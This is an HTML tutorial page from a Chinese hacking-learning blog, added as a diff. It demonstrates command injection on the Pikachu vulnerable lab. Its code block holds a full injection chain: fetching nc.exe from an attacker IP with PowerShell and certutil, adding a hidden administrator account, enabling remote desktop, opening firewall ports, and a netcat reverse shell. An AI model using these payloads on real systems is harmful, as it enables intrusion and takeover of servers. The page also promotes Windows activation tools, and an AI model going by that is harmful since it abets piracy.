@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+
+<!--欢迎来到hk987，人类的进化就靠你了-->
+ <!--
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░▒▓████████▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░░░░░░▒▓█▓▒░ 
+░▒▓████████▓▒░▒▓███████▓▒░░░▒▓███████▓▒░░▒▓██████▓▒░░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░░▒▓█▓▒░  
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░░░░░░▒▓█▓▒░░░▒▓█▓▒░▒▓█▓▒░░░░▒▓█▓▒░   
+░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░ ░▒▓██████▓▒░░░░▒▓█▓▒░
+-->
+<!--前进!不择手段的前进-->
+<!--Copyright©hk987.fun-->
+<!--PC端Google和Firefox支持良好,移动端支持良好-->
+
+<html lang="zh-cn">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="hk987-你在世俗里的名字不重要了">
+	<meta name="author" content="hk987">
+	<meta name="keywords" content="hk987,hk987.fun,hk987,黑客987,黑客学习,Windows技术,Linux技术,Archlinux,Linux软件,漏洞挖掘,网络安全,渗透测试,自动化办公,python全自动办公,Windows系统激活,新手学电脑,IT技术,Rust,Rust编程,黑客技术,黑客,红客,honker,hack,hacker,网络安全,信息安全,网络安全学习,计算机小白,网安入门,网络安全入门,渗透测试,黑客技术,网络基础入门,操作系统,新手学电脑,小白学电脑,hack学习,hack入门,Windows基础,linux基础,Archlinux基础,Rust基础,Rust入门,Rust编程基础,黑客入门,Ubuntu入门,Manjaro,Endeavouros,红帽系统,centos基础学习,Rocky系统基础,Linux基础命令,Windows批处理,Windows安全,Linux安全,Kali基础,Kali渗透测试,KaliLinux,BlackArch,Github,加密解密,具体数学,线性代数,离散数学,红队攻防,蓝队攻防,黑客靶场练习,黑客靶场,黑客实战,hack实战,hack编程,黑客编程">
+	<title>[Win基础]-9-RCE远程执行漏洞初探 - hk987.fun - www.hk987.fun</title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.png">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/home.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!--prism.js代码高亮模块-->
+	<link rel="stylesheet" href="../css/prism.css" data-noprefix />
+	<script src="../plugins/prism.js"></script>
+	<!--/prism.js代码高亮模块-->
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container">
+				<!-- 根大纲-->
+				<a href="../index.html" title="Hk987首页">
+					<h1 class="nav-logo">HK987 - hk987.fun</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					 S=−k∑pilnpi
+				</h2>
+				<nav class="nav-links">
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1>
+					<ul>
+						<li>
+							<a href="../index.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">wiki</span></span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>[Win基础]-9-RCE远程执行漏洞初探</h1>	
+				</header>
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>这篇文章主要通过pikachu这个漏洞测试平台，让大家理解一下什么是RCE远程代码执行漏洞，刚好借此机会，让前面学过的所有命令都能够得到应用。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#windows-RCE-1">0×1.视频中使用到的命令解析</a></li>
+						 <li><a href="#windows-RCE-2">0×2.RCE远程执行漏洞视频演示</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					<h2 id="windows-RCE-1">0×1.视频中使用到的命令解析</h2>
+					<p>RCE漏洞简介：RCE(remote command/code execute，远程命令执行)漏洞，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口，比如我们常见的路由器、防火墙、入侵检测等设备的web管理界面上， 一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后，设备就会对用户输入的IP地址进行ping测试，并返回测试结果，并且这个ping程序的执行是在服务器上。如果设计者在完成该功能时，没有对用户的输入进行语法的过滤，则可能会导致攻击者通过该接口提交“恶意指令”，让后台进行执行，从而控制整个后台服务器。</p>
+					<p>实验简述：使用pikachu平台搭建的Web页面的RCE漏洞测试页面中，提供了一个用来测试Ping的输入框，但是这个输入框并没有对&amp;这种符号进行过滤，也没有限定用户输入的内容只能是IP地址，这就让使用者可以通过ip地址后面添加&amp;符号，再追加需要执行的命令，来让远程计算机执行我们想要的指令，例如下载指令，下载一个nc到远程计算机上， 再用nc反弹连接到控制者的计算机，完成控制。</p>
+					<p>视频中用到的命令：</p>
+					<pre class='line-numbers' data-prismjs-copy='复制代码' data-prismjs-copy-success='成功复制！' >
+					<code class="lang-powershell">
+					#视频中用到的命令解析
+					//下载文件的命令，需要在本地搭建一个http服务，本例中，攻击者的IP为192.168.80.1，并且已经搭建了http服务：
+					//Powershell版
+					powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadFile('http://192.168.80.1:80/nc.exe', nc.exe)"
+					//CMD版
+					certutil.exe -urlcache -split -f http://192.168.80.1/nc.exe nc.exe
+
+					//命令行开启远程桌面
+					REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+					//开启windows单用户多开远程桌面的命令
+					reg add "hklm\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 0
+
+					//关闭windows远程桌面的命令：
+					REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
+
+					//也可以通过这个cmd命令开启或关闭远程桌面：
+					//开启
+					wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
+					//关闭
+					wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
+
+					//查看远程桌面端口号
+					reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
+
+					//防火墙允许访问远程桌面端口，假设远程计算机将远程桌面端口更改成了1314
+					netsh advfirewall firewall add rule name="1314" dir=in protocol=tcp localport=1314 action=allow enable=yes
+
+					#这是视频中构建的语句供参考
+					//1.从192.168.80.1下载nc.exe到服务器上
+					127.0.0.1 -n 1 & certutil.exe -urlcache -split -f http://192.168.80.1/nc.exe nc.exe
+					
+					//2.创建一个用户并添加到管理员组
+					127.0.0.1 -n 1 & net user hk987$ hk987123 /add
+					127.0.0.1 -n 1 & net localgroup administrators hk987$ /add
+
+					//3.查询远程桌面端口号，根据返回的16进制值计算出10进制
+					127.0.0.1 -n 1 & reg query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber 
+
+					//4.开启windows单用户多开远程桌面的命令
+					127.0.0.1 -n 1 & REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
+					//5.将查询到的远程桌面端口1314放入防火墙入站允许策略
+					127.0.0.1 -n 1 & netsh advfirewall firewall add rule name="1314" dir=in protocol=tcp localport=1314 action=allow enable=yes
+
+					//6.在192.168.80.1用nc监听1234端口后，让服务器将cmd反弹到这个端口
+					127.0.0.1 -n 1 & nc -e cmd.exe 192.168.80.1 1234
+					</code>
+					</pre>
+
+					<h2 id="windows-RCE-2">0×2.RCE远程执行漏洞视频演示</h2>
+
+					<p>点击下方视频标题，可以进入B站观看高清版本</p>
+					<p>【第13天】Windows基础-13-RCE远程执行漏洞实验初探-windows命令行开启3389远程桌面-开始炫~大一女新生挑战一年精通网络安全-信息安全-计算机安全-计算机安全技术-网络安全技术-黑客技术，我无所畏惧</p>
+					<iframe src="//player.bilibili.com/player.html?aid=451694049&bvid=BV1Tj41157fq&cid=1351717233&p=1&autoplay=0" allowfullscreen="allowfullscreen" width="100%" height="500" scrolling="no" frameborder="0" > </iframe>
+
+					<p>视频中用到的工具，来自UC网盘分享：</p> 
+					<p>*「RCE远程执行漏洞环境+笔记」:<a title="RCE远程执行漏洞环境+笔记" style="color: rgb(4,181,150);" href="https://drive.uc.cn/s/b2c8cdcf96464" target="_blank">点击打开</a>  密码：YpyB</p>
+
+					<p>第一篇文章中演示的虚拟机的下载可以通过我这个uc网盘去下载，里面包含了很多现成的系统镜像，还有虚拟机的激活码，也可以去官方下载，千万别去其他地方下精简版，很多问题都出在这里。网盘包含了最新的Windows+激活软件，流行的Linux镜像，会持续更新。</p>
+					<p>*「虚拟机全套软件+ISO镜像文件」(会一直持续更新):<a title="虚拟机全套软件+ISO镜像文件" style="color: rgb(4,181,150);" href="https://drive.uc.cn/s/eb63654987fb4" target="_blank">点击打开</a> 密码：8s6H</p>
+					<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="hk987.fun" style="color: rgb(4,181,150);" href="https://www.hk987.fun" target="_blank">hk987.fun</a>
+					</p>
+					<p>*原文连接:<a title="[Win基础]-9-RCE远程执行漏洞初探" style="color: rgb(4,181,150);" href="https://www.hk987.fun/hk/windows-base-9.html" target="_blank">https://www.hk987.fun/hk/windows-base-9.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			hk987.fun &nbsp;<img src="../logo/copyright.png" alt="未经作者允许,禁止任何形式的复制与转载" title="未经作者允许,禁止任何形式的复制与转载">&nbsp;All Rights Reserved.
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
